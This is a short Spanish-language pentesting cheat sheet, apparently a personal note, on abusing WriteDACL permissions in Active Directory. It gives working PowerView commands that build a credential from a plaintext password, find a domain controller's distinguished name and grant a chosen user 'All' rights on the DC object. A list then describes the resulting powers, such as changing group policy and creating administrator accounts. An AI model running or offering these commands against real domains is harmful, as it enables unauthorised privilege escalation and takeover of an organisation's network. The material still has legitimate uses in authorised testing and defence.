# Abuso ACL 

Tags: #AD #ACL #Windows 

## WriteDalc sobre PC

```powershell
# Compartir credenciales en Powershell 
❯ Import-Module .\PowerView-3.0.ps1

❯ $SecPassword = ConvertTo-SecureString 'Password@1' -AsPlainText -Force  # Creamos un objeto 

❯ $Cred = New-Object System.Management.Automation.PSCredential('domain1.corp\writedacldc.user', $SecPassword) # Creamos un objeto de tipo credencial 

❯ Get-DomainComputer -Identity <NameServer o cn> | select distinguishedname  # El resultado lo colocamos en el comando de abajo despues de 'TargetIdentity'

❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'CN=FIRST-DC,OU=Domain Controllers,DC=domain1,DC=corp' -PrincipalIdentity user.hacked -Rights All -Verbose    

	# PrincipalIdentity = Cualquier objeto en AD donde se puedan adjuntar permisos (Usuarios, Grupos, PC)
	# Rights = 'All' significa que le de todos los permisos 
```

```bash 
Con los permisos 'All' otorgados al usuario 'user.hacked' en un objeto específico del Controlador de Dominio en Active Directory, el usuario podría realizar una amplia gama de acciones, incluyendo:

1. Modificar Configuraciones del Controlador de Dominio: Cambiar configuraciones críticas del Controlador de Dominio.
2. Modificar Políticas de Grupo: Cambiar políticas que afectan a todos los usuarios y computadoras del dominio.
3. Acceder a Datos Sensibles: Leer información sensible almacenada en el Controlador de Dominio.
4. Crear o Eliminar Cuentas de Usuario: Potencialmente crear cuentas de administrador o eliminar cuentas existentes.
5. Cambiar Permisos y Derechos de Otros Usuarios: Modificar los derechos de acceso de otros usuarios en el dominio.
```